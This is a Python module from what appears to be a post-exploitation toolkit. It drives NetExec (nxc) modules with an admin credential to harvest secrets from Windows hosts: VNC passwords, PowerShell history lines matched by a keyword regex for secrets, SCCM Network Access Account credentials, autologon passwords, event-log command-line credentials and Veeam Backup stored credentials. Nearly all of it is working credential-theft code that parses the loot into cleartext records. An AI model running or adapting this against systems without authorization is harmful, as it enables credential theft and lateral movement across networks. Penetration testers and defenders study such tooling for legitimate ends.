"""Loot that NetExec (nxc) modules do well: VNC, PowerShell history, SCCM,
autologon, event-log creds, Veeam. Run once per host with an admin credential."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

NXC_LINE = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")


class _NxcModule(BaseCollector):
    per_credential = False
    requires = ("nxc",)
    module = ""
    source = ""
    proto = "smb"

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("nxc")
        if not bin_:
            return []
        cmd = [bin_, self.proto, self.host] + cred.nxc_auth_args() + ["-M", self.module]
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _messages(self, out: str) -> List[str]:
        msgs = []
        for line in strip_ansi(out).splitlines():
            m = NXC_LINE.match(line)
            if m:
                msgs.append(m.group(1).strip())
        return msgs

    def _parse(self, out: str) -> List[Secret]:
        return []


class VncCollector(_NxcModule):
    name = "VNC"; source = "VNC"; module = "vnc"
    description = "VNC passwords from registry/config"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = re.search(r"(?:password|found)[:\s]+(\S+)", msg, re.I)
            if m and self.module in out.lower():
                found.append(Secret(self.host, "VNC", "", m.group(1),
                                    Status.CLEARTEXT, secret_type="password"))
        return found


class PSHistoryCollector(_NxcModule):
    name = "PSHistory"; source = "PSHistory"; module = "powershell_history"
    description = "PowerShell console history (hunts for inline secrets)"

    SECRET_HINT = re.compile(r"(pass|pwd|secret|cred|-AsPlainText|ConvertTo-SecureString|"
                             r"net user|token|apikey)", re.I)

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            if self.SECRET_HINT.search(msg):
                found.append(Secret(self.host, "PSHistory", "", msg[:160],
                                    Status.INFO, secret_type="history-line",
                                    notes="review raw file"))
        return found


class SccmCollector(_NxcModule):
    name = "SCCM"; source = "SCCM"; module = "sccm"
    description = "SCCM Network Access Account / policy secrets"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = re.search(r"(user|account)[:\s]+(\S+).*?(pass|secret)[:\s]+(\S+)", msg, re.I)
            if m:
                found.append(Secret(self.host, "SCCM", m.group(2), m.group(4),
                                    Status.CLEARTEXT, secret_type="password"))
        return found


class _UserPassNxc(_NxcModule):
    """Shared parser for modules that print a user + password pair somewhere."""
    def _parse(self, out: str) -> List[Secret]:
        found = []
        user = None
        for msg in self._messages(out):
            mu = re.search(r"(?:user(?:name)?|account|login)[\s:=]+([^\s]+)", msg, re.I)
            mp = re.search(r"(?:password|pass|pwd|secret)[\s:=]+([^\s]+)", msg, re.I)
            if mu and not mp:
                user = mu.group(1)
            if mp:
                found.append(Secret(self.host, self.source, (mu.group(1) if mu else user) or "",
                                    mp.group(1), Status.CLEARTEXT, secret_type="password",
                                    notes=self.source))
                user = None
        return found


class AutologonCollector(_UserPassNxc):
    name = "Autologon"; source = "Autologon"; module = "gpp_autologin"
    description = "Registry/GPP autologon credentials (Winlogon)"


class EventlogCollector(_UserPassNxc):
    name = "EventLog"; source = "EventLog"; module = "eventlog_creds"
    description = "Credentials in Security event log (4688 command lines)"


class VeeamCollector(_UserPassNxc):
    name = "Veeam"; source = "Veeam"; module = "veeam"
    description = "Veeam Backup stored credentials"
